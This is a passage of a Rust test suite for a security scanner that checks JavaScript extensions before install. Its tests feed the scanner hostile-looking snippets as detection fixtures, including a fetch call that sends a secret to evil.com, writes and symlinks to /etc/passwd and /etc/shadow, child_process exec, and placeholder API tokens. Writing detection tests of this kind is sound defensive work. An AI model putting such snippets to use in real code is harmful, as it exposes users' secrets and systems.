        assert!(has_rule(&report, SecurityRuleId::ProcessDlopen));
    }

    #[test]
    fn detect_proto_pollution() {
        let report = scan("obj.__proto__ = malicious;");
        assert!(has_rule(&report, SecurityRuleId::ProtoPollution));
        assert_eq!(report.overall_tier, RiskTier::Critical);
    }

    #[test]
    fn detect_set_prototype_of() {
        let report = scan("Object.setPrototypeOf(target, evil);");
        assert!(has_rule(&report, SecurityRuleId::ProtoPollution));
    }

    #[test]
    fn detect_require_cache_manipulation() {
        let report = scan("delete require.cache[require.resolve('./module')];");
        assert!(has_rule(&report, SecurityRuleId::RequireCacheManip));
        assert_eq!(report.overall_tier, RiskTier::Critical);
    }

    // ---- High tier detections ----

    #[test]
    fn detect_hardcoded_secret() {
        let report = scan(r#"const api_key  = "sk-ant-api03-abc123";"#);
        assert!(has_rule(&report, SecurityRuleId::HardcodedSecret));
        assert!(report.needs_review());
    }

    #[test]
    fn detect_hardcoded_password() {
        let report = scan(r#"const password  = "s3cretP@ss";"#);
        assert!(has_rule(&report, SecurityRuleId::HardcodedSecret));
    }

    #[test]
    fn env_lookup_not_flagged_as_secret() {
        let report = scan("const key = process.env.API_KEY;");
        // Should flag ProcessEnvAccess but NOT HardcodedSecret.
        assert!(has_rule(&report, SecurityRuleId::ProcessEnvAccess));
        assert!(!has_rule(&report, SecurityRuleId::HardcodedSecret));
    }

    #[test]
    fn empty_secret_not_flagged() {
        let report = scan(r#"const api_key  = "";"#);
        assert!(!has_rule(&report, SecurityRuleId::HardcodedSecret));
    }

    #[test]
    fn detect_token_prefix() {
        let report = scan(r#"const token  = "ghp_abc123def456";"#);
        assert!(has_rule(&report, SecurityRuleId::HardcodedSecret));
    }

    #[test]
    fn detect_dynamic_import() {
        let report = scan("const mod = await import(userInput);");
        assert!(has_rule(&report, SecurityRuleId::DynamicImport));
    }

    #[test]
    fn static_import_not_flagged_as_dynamic() {
        let report = scan("import fs from 'node:fs';");
        assert!(!has_rule(&report, SecurityRuleId::DynamicImport));
    }

    #[test]
    fn detect_define_property_on_global() {
        let report = scan("Object.defineProperty(globalThis, 'fetch', { value: evilFetch });");
        assert!(has_rule(&report, SecurityRuleId::DefinePropertyAbuse));
    }

    #[test]
    fn detect_network_exfiltration() {
        let report = scan("fetch(`https://evil.com/?data=${secret}`);");
        assert!(has_rule(&report, SecurityRuleId::NetworkExfiltration));
    }

    #[test]
    fn detect_sensitive_path_write() {
        let report = scan("fs.writeFileSync('/etc/passwd', payload);");
        assert!(has_rule(&report, SecurityRuleId::SensitivePathWrite));
    }

    #[test]
    fn normal_write_not_flagged() {
        let report = scan("fs.writeFileSync('/tmp/out.txt', data);");
        assert!(!has_rule(&report, SecurityRuleId::SensitivePathWrite));
    }

    // ---- Medium tier detections ----

    #[test]
    fn detect_process_env() {
        let report = scan("const v = process.env.NODE_ENV;");
        assert!(has_rule(&report, SecurityRuleId::ProcessEnvAccess));
        assert_eq!(report.overall_tier, RiskTier::Medium);
    }

    #[test]
    fn detect_timer_abuse() {
        let report = scan("setInterval(pollServer, 1);");
        assert!(has_rule(&report, SecurityRuleId::TimerAbuse));
    }

    #[test]
    fn normal_timer_not_flagged() {
        let report = scan("setInterval(tick, 1000);");
        assert!(!has_rule(&report, SecurityRuleId::TimerAbuse));
    }

    #[test]
    fn detect_proxy_usage() {
        let report = scan("const p = new Proxy(target, handler);");
        assert!(has_rule(&report, SecurityRuleId::ProxyReflect));
    }

    #[test]
    fn detect_reflect_usage() {
        let report = scan("const v = Reflect.get(obj, 'key');");
        assert!(has_rule(&report, SecurityRuleId::ProxyReflect));
    }

    #[test]
    fn detect_with_statement() {
        let report = scan("with (obj) { x = 1; }");
        assert!(has_rule(&report, SecurityRuleId::WithStatement));
    }

    // ---- Low tier detections ----

    #[test]
    fn detect_debugger_statement() {
        let report = scan("debugger;");
        assert!(has_rule(&report, SecurityRuleId::DebuggerStatement));
        assert_eq!(report.overall_tier, RiskTier::Low);
    }

    #[test]
    fn detect_console_error() {
        let report = scan("console.error(sensitiveData);");
        assert!(has_rule(&report, SecurityRuleId::ConsoleInfoLeak));
    }

    #[test]
    fn console_log_not_flagged() {
        // Only console.error/warn flagged, not console.log.
        let report = scan("console.log('hello');");
        assert!(!has_rule(&report, SecurityRuleId::ConsoleInfoLeak));
    }

    // ---- Report structure ----

    #[test]
    fn report_schema_and_rulebook_version() {
        let report = scan("// clean");
        assert_eq!(report.schema, SECURITY_SCAN_SCHEMA);
        assert_eq!(report.rulebook_version, SECURITY_RULEBOOK_VERSION);
    }

    #[test]
    fn report_json_roundtrip() {
        let report = scan("eval('bad'); process.env.KEY;");
        let json = report.to_json().unwrap();
        let back: SecurityScanReport = serde_json::from_str(&json).unwrap();
        assert_eq!(back.extension_id, "test-ext");
        assert_eq!(back.overall_tier, RiskTier::Critical);
        assert!(!back.findings.is_empty());
    }

    #[test]
    #[allow(clippy::needless_raw_string_hashes)]
    fn report_tier_counts_accurate() {
        let report = scan(
            r#"
eval('bad');
const api_key  = "sk-ant-secret";
process.env.KEY;
debugger;
"#,
        );
        assert!(report.tier_counts.critical >= 1);
        assert!(report.tier_counts.high >= 1);
        assert!(report.tier_counts.medium >= 1);
        assert!(report.tier_counts.low >= 1);
    }

    #[test]
    fn findings_sorted_by_tier_worst_first() {
        let report = scan(
            r"
debugger;
eval('x');
process.env.KEY;
",
        );
        // First finding should be Critical (eval), last should be Low (debugger).
        assert!(!report.findings.is_empty());
        assert_eq!(report.findings[0].risk_tier, RiskTier::Critical);
        let last = report.findings.last().unwrap();
        assert!(last.risk_tier >= report.findings[0].risk_tier);
    }

    // ---- Evidence ledger ----

    #[test]
    fn evidence_ledger_jsonl_format() {
        let report = scan("eval('x'); debugger;");
        let jsonl = security_evidence_ledger_jsonl(&report).unwrap();
        let lines: Vec<&str> = jsonl.lines().collect();
        assert_eq!(lines.len(), report.findings.len());
        for line in &lines {
            let entry: SecurityEvidenceLedgerEntry = serde_json::from_str(line).unwrap();
            assert_eq!(entry.schema, SECURITY_EVIDENCE_LEDGER_SCHEMA);
            assert_eq!(entry.extension_id, "test-ext");
            assert_eq!(entry.rulebook_version, SECURITY_RULEBOOK_VERSION);
        }
    }

    #[test]
    fn evidence_ledger_entry_indices_monotonic() {
        let report = scan("eval('a'); eval('b'); debugger;");
        let jsonl = security_evidence_ledger_jsonl(&report).unwrap();
        let entries: Vec<SecurityEvidenceLedgerEntry> = jsonl
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect();
        for (i, entry) in entries.iter().enumerate() {
            assert_eq!(entry.entry_index, i);
        }
    }

    // ---- Comments are skipped ----

    #[test]
    fn single_line_comment_not_flagged() {
        let report = scan("// eval('bad');");
        assert!(!has_rule(&report, SecurityRuleId::EvalUsage));
    }

    #[test]
    fn block_comment_not_flagged() {
        let report = scan("/* eval('bad'); */");
        assert!(!has_rule(&report, SecurityRuleId::EvalUsage));
    }

    // ---- Determinism ----

    #[test]
    fn scan_is_deterministic() {
        let source = r#"
eval('x');
const api_key  = "sk-ant-test";
process.env.HOME;
debugger;
"#;
        let r1 = scan(source);
        let r2 = scan(source);
        let j1 = r1.to_json().unwrap();
        let j2 = r2.to_json().unwrap();
        assert_eq!(j1, j2, "Security scan must be deterministic");
    }

    // ---- Multiple findings per line ----

    #[test]
    fn multiple_rules_fire_on_same_line() {
        // eval + process.env on same line.
        let report = scan("eval(process.env.SECRET);");
        assert!(has_rule(&report, SecurityRuleId::EvalUsage));
        assert!(has_rule(&report, SecurityRuleId::ProcessEnvAccess));
    }

    // ---- should_block / needs_review ----

    #[test]
    fn should_block_only_for_critical() {
        assert!(scan("eval('x');").should_block());
        assert!(!scan("process.env.X;").should_block());
        assert!(!scan("debugger;").should_block());
    }

    #[test]
    fn needs_review_for_critical_and_high() {
        assert!(scan("eval('x');").needs_review());
        assert!(scan(r#"const api_key  = "sk-ant-test";"#).needs_review());
        assert!(!scan("process.env.X;").needs_review());
    }

    // ================================================================
    // Rulebook v2.0.0 — new rule tests
    // ================================================================

    // ---- SEC-SPAWN-001: child_process command execution ----

    #[test]
    fn detect_child_process_exec() {
        let report = scan("const { exec } = require('child_process'); exec('ls');");
        assert!(has_rule(&report, SecurityRuleId::ChildProcessSpawn));
        assert_eq!(report.overall_tier, RiskTier::Critical);
        assert!(report.should_block());
    }

    #[test]
    fn detect_child_process_spawn() {
        let report = scan("const cp = require('child_process'); cp.spawn('node', ['app.js']);");
        assert!(has_rule(&report, SecurityRuleId::ChildProcessSpawn));
    }

    #[test]
    fn detect_child_process_fork() {
        let report = scan("childProcess.fork('./worker.js');");
        assert!(has_rule(&report, SecurityRuleId::ChildProcessSpawn));
    }

    #[test]
    fn regular_exec_not_flagged_as_spawn() {
        // exec() without child_process context should NOT trigger.
        let report = scan("const result = exec('query');");
        assert!(!has_rule(&report, SecurityRuleId::ChildProcessSpawn));
    }

    // ---- SEC-CONSTRUCTOR-001: constructor escape ----

    #[test]
    fn detect_constructor_escape() {
        let report = scan("const fn = constructor.constructor('return this')();");
        assert!(has_rule(&report, SecurityRuleId::ConstructorEscape));
        assert_eq!(report.overall_tier, RiskTier::Critical);
    }

    #[test]
    fn detect_constructor_escape_bracket() {
        let report = scan(r#"const fn = constructor["constructor"]('return this')();"#);
        assert!(has_rule(&report, SecurityRuleId::ConstructorEscape));
    }

    // ---- SEC-NATIVEMOD-001: native module require ----

    #[test]
    fn detect_native_node_require() {
        let report = scan(r"const addon = require('./native.node');");
        assert!(has_rule(&report, SecurityRuleId::NativeModuleRequire));
        assert_eq!(report.overall_tier, RiskTier::Critical);
    }

    #[test]
    fn detect_native_so_require() {
        let report = scan(r"const lib = require('/usr/lib/evil.so');");
        assert!(has_rule(&report, SecurityRuleId::NativeModuleRequire));
    }

    #[test]
    fn detect_native_dylib_require() {
        let report = scan(r"const lib = require('./lib.dylib');");
        assert!(has_rule(&report, SecurityRuleId::NativeModuleRequire));
    }

    #[test]
    fn normal_require_not_flagged_as_native() {
        let report = scan(r"const fs = require('fs');");
        assert!(!has_rule(&report, SecurityRuleId::NativeModuleRequire));
    }

    // ---- SEC-GLOBAL-001: global mutation ----

    #[test]
    fn detect_global_this_mutation() {
        let report = scan("globalThis.fetch = evilFetch;");
        assert!(has_rule(&report, SecurityRuleId::GlobalMutation));
        assert!(report.needs_review());
    }

    #[test]
    fn detect_global_property_mutation() {
        let report = scan("global.process = fakeProcess;");
        assert!(has_rule(&report, SecurityRuleId::GlobalMutation));
    }

    #[test]
    fn detect_global_bracket_mutation() {
        let report = scan("globalThis['fetch'] = evilFetch;");
        assert!(has_rule(&report, SecurityRuleId::GlobalMutation));
    }

    #[test]
    fn global_read_not_flagged() {
        // Reading globalThis should not trigger (no assignment).
        let report = scan("const f = globalThis.fetch;");
        assert!(!has_rule(&report, SecurityRuleId::GlobalMutation));
    }

    // ---- SEC-SYMLINK-001: symlink creation ----

    #[test]
    fn detect_fs_symlink() {
        let report = scan("fs.symlinkSync('/etc/passwd', '/tmp/link');");
        assert!(has_rule(&report, SecurityRuleId::SymlinkCreation));
        assert!(report.needs_review());
    }

    #[test]
    fn detect_fs_link() {
        let report = scan("fs.linkSync('/etc/shadow', '/tmp/hard');");
        assert!(has_rule(&report, SecurityRuleId::SymlinkCreation));
    }

    // ---- SEC-CHMOD-001: permission changes ----

    #[test]
    fn detect_chmod() {
        let report = scan("fs.chmodSync('/tmp/script.sh', 0o777);");
        assert!(has_rule(&report, SecurityRuleId::PermissionChange));
        assert!(report.needs_review());
    }

    #[test]
    fn detect_chown() {
        let report = scan("fs.chown('/etc/passwd', 0, 0, cb);");
        assert!(has_rule(&report, SecurityRuleId::PermissionChange));
    }

    // ---- SEC-SOCKET-001: socket listeners ----

    #[test]
    fn detect_create_server() {
        let report = scan("const server = http.createServer(handler);");
        assert!(has_rule(&report, SecurityRuleId::SocketListener));
        assert!(report.needs_review());
    }

    #[test]
    fn detect_create_socket() {
        let report = scan("const sock = dgram.createSocket('udp4');");
        assert!(has_rule(&report, SecurityRuleId::SocketListener));
    }

    // ---- SEC-WASM-001: WebAssembly usage ----

    #[test]
    fn detect_webassembly_instantiate() {
        let report = scan("const instance = await WebAssembly.instantiate(buffer);");
        assert!(has_rule(&report, SecurityRuleId::WebAssemblyUsage));
        assert!(report.needs_review());
    }

    #[test]
    fn detect_webassembly_compile() {
        let report = scan("const module = WebAssembly.compile(bytes);");
        assert!(has_rule(&report, SecurityRuleId::WebAssemblyUsage));
    }

    // ---- SEC-ARGUMENTS-001: arguments.callee/caller ----

    #[test]
    fn detect_arguments_callee() {
        let report = scan("const self = arguments.callee;");
        assert!(has_rule(&report, SecurityRuleId::ArgumentsCallerAccess));
        assert_eq!(report.overall_tier, RiskTier::Medium);
    }

    #[test]
    fn detect_arguments_caller() {
        let report = scan("const parent = arguments.caller;");
        assert!(has_rule(&report, SecurityRuleId::ArgumentsCallerAccess));
    }

    // ---- New rule IDs serde roundtrip ----

    #[test]
    fn new_rule_id_serde_roundtrip() {
        let rules = [
            SecurityRuleId::ChildProcessSpawn,
            SecurityRuleId::ConstructorEscape,
            SecurityRuleId::NativeModuleRequire,
            SecurityRuleId::GlobalMutation,
            SecurityRuleId::SymlinkCreation,
            SecurityRuleId::PermissionChange,
            SecurityRuleId::SocketListener,
            SecurityRuleId::WebAssemblyUsage,
            SecurityRuleId::ArgumentsCallerAccess,
        ];
        for rule in &rules {
            let json = serde_json::to_string(rule).unwrap();
            let back: SecurityRuleId = serde_json::from_str(&json).unwrap();
            assert_eq!(*rule, back, "roundtrip failed for {rule}");
        }
    }

    #[test]
    fn new_rule_id_names_are_stable() {
        assert_eq!(
            serde_json::to_string(&SecurityRuleId::ChildProcessSpawn).unwrap(),
            "\"SEC-SPAWN-001\""
        );
        assert_eq!(
            serde_json::to_string(&SecurityRuleId::ConstructorEscape).unwrap(),
            "\"SEC-CONSTRUCTOR-001\""
        );
        assert_eq!(
            serde_json::to_string(&SecurityRuleId::NativeModuleRequire).unwrap(),
            "\"SEC-NATIVEMOD-001\""
        );
        assert_eq!(
            serde_json::to_string(&SecurityRuleId::GlobalMutation).unwrap(),
            "\"SEC-GLOBAL-001\""
        );
    }

    // ---- Determinism with new rules ----

    #[test]
    fn scan_with_new_rules_is_deterministic() {
        let source = r"
eval('x');
const cp = require('child_process'); cp.exec('ls');
globalThis.foo = 'bar';
fs.symlinkSync('/a', '/b');
fs.chmodSync('/tmp/x', 0o777);
const s = http.createServer(h);
const m = WebAssembly.compile(b);
const c = arguments.callee;
constructor.constructor('return this')();
const addon = require('./evil.node');
";
        let r1 = scan(source);
        let r2 = scan(source);
        let j1 = r1.to_json().unwrap();
        let j2 = r2.to_json().unwrap();
        assert_eq!(j1, j2, "Scan with new rules must be deterministic");
    }

    // ---- Deterministic sort: file + line within tier ----

    #[test]
    fn findings_sorted_deterministically_within_tier() {
        let findings = vec![
            SecurityFinding {
                rule_id: SecurityRuleId::ProcessEnvAccess,
                risk_tier: RiskTier::Medium,
                rationale: "env".into(),
                file: Some("b.ts".into()),
                line: Some(10),
                column: Some(1),
                snippet: None,
            },
            SecurityFinding {
                rule_id: SecurityRuleId::ProcessEnvAccess,
                risk_tier: RiskTier::Medium,
                rationale: "env".into(),
                file: Some("a.ts".into()),
                line: Some(5),
                column: Some(1),
                snippet: None,
            },
        ];
        let report = SecurityScanReport::from_findings("test".into(), findings);
        // a.ts should come before b.ts within same tier.
        assert_eq!(
            report.findings[0].file.as_deref(),
            Some("a.ts"),
            "Findings should be sorted by file within tier"
        );
        assert_eq!(report.findings[1].file.as_deref(), Some("b.ts"));
    }

    // ---- Evidence ledger with new rules ----

    #[test]
    fn evidence_ledger_includes_new_rules() {
        let source = r"
constructor.constructor('return this')();
const m = WebAssembly.compile(b);
const c = arguments.callee;
";
        let report = scan(source);
        let jsonl = security_evidence_ledger_jsonl(&report).unwrap();
        let entries: Vec<SecurityEvidenceLedgerEntry> = jsonl
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect();
        assert!(!entries.is_empty());
        assert!(
            entries
                .iter()
                .any(|e| e.rule_id == SecurityRuleId::ConstructorEscape)
        );
        assert!(
            entries
                .iter()
                .any(|e| e.rule_id == SecurityRuleId::WebAssemblyUsage)
        );
        // Rulebook version should be 2.1.0
        for entry in &entries {
            assert_eq!(entry.rulebook_version, "2.1.0");
        }
    }

    // ---- Rulebook version ----

    #[test]
    fn rulebook_version_is_v2() {
        assert_eq!(SECURITY_RULEBOOK_VERSION, "2.1.0");
    }

    // ---- New rule tier consistency ----

    #[test]
    fn new_rule_default_tier_consistency() {
        assert_eq!(
            SecurityRuleId::ChildProcessSpawn.default_tier(),
            RiskTier::Critical
        );
        assert_eq!(
            SecurityRuleId::ConstructorEscape.default_tier(),
            RiskTier::Critical
        );
        assert_eq!(
            SecurityRuleId::NativeModuleRequire.default_tier(),
            RiskTier::Critical
        );
        assert_eq!(
            SecurityRuleId::GlobalMutation.default_tier(),
            RiskTier::High
        );
        assert_eq!(
            SecurityRuleId::SymlinkCreation.default_tier(),
            RiskTier::High
        );
        assert_eq!(
            SecurityRuleId::PermissionChange.default_tier(),
            RiskTier::High
        );
        assert_eq!(
            SecurityRuleId::SocketListener.default_tier(),
            RiskTier::High
        );
        assert_eq!(
            SecurityRuleId::WebAssemblyUsage.default_tier(),
            RiskTier::High
        );
        assert_eq!(
            SecurityRuleId::ArgumentsCallerAccess.default_tier(),
            RiskTier::Medium
        );
    }

    // ---- Install-time risk classifier with new rules ----

    #[test]
    fn install_time_risk_blocks_critical_new_rules() {
        let source = "constructor.constructor('return this')();";
        let policy = ExtensionPolicy::default();
        let report = classify_extension_source("test-ext", source, &policy);
        assert!(report.should_block());
        assert_eq!(report.composite_risk_tier, RiskTier::Critical);
        assert_eq!(report.recommendation, InstallRecommendation::Block);
    }

    #[test]
    fn install_time_risk_reviews_high_new_rules() {
        let source = "const m = WebAssembly.compile(bytes);";
        let policy = ExtensionPolicy::default();
        let report = classify_extension_source("test-ext", source, &policy);
        assert!(report.needs_review());
        assert!(matches!(
            report.composite_risk_tier,
            RiskTier::Critical | RiskTier::High
        ));
    }

    // ---- Comments skip new rules too ----

    #[test]
    fn commented_new_rules_not_flagged() {
        let report = scan("// constructor.constructor('return this')();");
        assert!(!has_rule(&report, SecurityRuleId::ConstructorEscape));
    }

    #[test]
    fn block_commented_new_rules_not_flagged() {
        let report = scan("/* WebAssembly.compile(bytes); */");
        assert!(!has_rule(&report, SecurityRuleId::WebAssemblyUsage));
    }

    // ── Property tests ──

    mod proptest_preflight {
        use super::*;
        use proptest::prelude::*;

        proptest! {
            #[test]
            fn eval_call_no_false_positive_on_method_calls(
                prefix in "[a-zA-Z]{1,10}",
                suffix in "[a-zA-Z0-9(), ]{0,20}",
            ) {
                // Method calls like `obj.eval(...)` should NOT be detected
                let text = format!("{prefix}.eval({suffix})");
                assert!(
                    !contains_eval_call(&text),
                    "method call should not trigger eval detection: {text}"
                );
            }

            #[test]
            fn eval_call_no_false_positive_on_identifier_suffix(
                prefix in "[a-zA-Z]{1,10}",
            ) {
                // Identifiers ending in "eval" like "retrieval(" should not match
                let text = format!("{prefix}eval(x)");
                // Only "eval(" at word boundary should match
                let expected = !is_js_ident_continue(*prefix.as_bytes().last().unwrap());
                assert!(
                    contains_eval_call(&text) == expected,
                    "eval detection mismatch for '{text}': expected {expected}"
                );
            }

            #[test]
            fn dynamic_import_never_triggers_on_static_imports(
                module in "[a-z@/.-]{1,30}",
            ) {
                let text = format!("import {{ foo }} from '{module}';");
                assert!(
                    !contains_dynamic_import(&text),
                    "static import should not trigger: {text}"
                );
            }

            #[test]
            fn dynamic_import_detects_import_call(
                module in "[a-z@/.-]{1,20}",
            ) {
                let text = format!("const m = import('{module}');");
                assert!(
                    contains_dynamic_import(&text),
                    "dynamic import should be detected: {text}"
                );
            }

            #[test]
            fn extract_quoted_string_roundtrips_double(
                content in "[a-zA-Z0-9 _.-]{0,50}",
            ) {
                let input = format!("\"{content}\" rest");
                let extracted = extract_quoted_string(&input);
                assert!(
                    extracted == Some(content.clone()),
                    "expected Some(\"{content}\"), got {extracted:?}"
                );
            }

            #[test]
            fn extract_quoted_string_roundtrips_single(
                content in "[a-zA-Z0-9 _.-]{0,50}",
            ) {
                let input = format!("'{content}' rest");
                let extracted = extract_quoted_string(&input);
                assert!(
                    extracted == Some(content.clone()),
                    "expected Some('{content}'), got {extracted:?}"
                );
            }

            #[test]
            fn extract_quoted_string_none_for_unquoted(
                text in "[a-zA-Z0-9]{1,20}",
            ) {
                assert!(
                    extract_quoted_string(&text).is_none(),
                    "unquoted text should return None: {text}"
                );
            }

            #[test]
            fn is_debugger_statement_deterministic(
                text in "[ \t]{0,5}debugger[; \t]{0,5}",
            ) {
                let r1 = is_debugger_statement(&text);
                let r2 = is_debugger_statement(&text);
                assert!(r1 == r2, "is_debugger_statement must be deterministic");
            }

            #[test]
            fn timer_abuse_only_triggers_below_10(interval in 0..100u64) {
                let text = format!("setInterval(fn, {interval});");
                let result = contains_timer_abuse(&text);
                if interval < 10 {
                    assert!(result, "interval {interval} < 10 should trigger");
                } else {
                    assert!(!result, "interval {interval} >= 10 should not trigger");
                }
            }

            #[test]
            fn hardcoded_secret_detects_known_token_prefixes(
                prefix in prop::sample::select(vec![
                    "sk-ant-".to_string(),
                    "ghp_".to_string(),
                    "gho_".to_string(),
                    "glpat-".to_string(),
                    "xoxb-".to_string(),
                ]),
                suffix in "[a-zA-Z0-9]{10,20}",
            ) {
                let text = format!("const token  = \"{prefix}{suffix}\";");
                assert!(
                    contains_hardcoded_secret(&text),
                    "token prefix '{prefix}' should be detected: {text}"
                );
            }

            #[test]
            fn hardcoded_secret_ignores_env_lookups(
                keyword in prop::sample::select(vec![
                    "api_key".to_string(),
                    "password".to_string(),
                    "secret_key".to_string(),
                    "auth_token".to_string(),
                ]),
            ) {
                let text = format!("process.env.{keyword}");
                assert!(
                    !contains_hardcoded_secret(&text),
                    "env lookup should not be flagged: {text}"
                );
            }

            #[test]
            fn eval_call_no_false_positive_on_underscore_identifiers(
                _dummy in Just(()),
            ) {
                let text = "my_eval('code')";
                assert!(
                    !contains_eval_call(text),
                    "underscore identifier prefix should not trigger eval detection: {text}"
                );
            }

            #[test]
            fn eval_call_no_false_positive_on_dollar_identifiers(
                _dummy in Just(()),
            ) {
                let text = "$eval('code')";
                assert!(
                    !contains_eval_call(text),
                    "dollar identifier prefix should not trigger eval detection: {text}"
                );
            }
        }
    }
}
